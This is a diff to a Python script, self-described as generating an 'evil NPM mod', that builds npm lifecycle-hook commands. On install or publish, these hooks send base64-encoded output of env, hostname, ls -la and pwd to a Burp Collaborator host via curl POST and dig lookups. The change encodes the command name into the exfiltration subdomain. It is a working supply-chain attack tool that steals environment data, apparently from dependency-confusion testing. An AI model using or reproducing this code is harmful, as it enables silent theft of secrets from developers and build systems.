@@ -3,7 +3,7 @@ import json
 import stat 
 import sys
 import argparse
-
+import base64
 
 parser = argparse.ArgumentParser(description="Generate an evil NPM mod")
 parser.add_argument("burp_collaborator_url")
@@ -34,7 +34,7 @@ non_prefixable_events = [
     "prepublishOnly"
 ]
 
-expression_template = lambda command,event : f"curl \"{event}.{command}.{burpcollaborator_link}\" -X POST --data $({command} | base64);"
+expression_template = lambda command,event : f"curl \"{event}.{base64.b64encode(command.encode('UTF-8')).decode('UTF-8')}.{burpcollaborator_link}\" -X POST --data $({command} | base64);"
 #expression_template = lambda bin,event,method : f'{bin} {method}.{bin}.{event}.{burpcollaborator_link};'
 script_template = lambda event: f"dig {event}.dig.{burpcollaborator_link};" + expression_template("env",event) + expression_template("hostname",event) + expression_template("ls -la",event) + expression_template("pwd",event)
 #script_template = lambda event,method: expression_template("nslookup",event,method) + expression_template("dig",event,method) + expression_template("curl",event,method)
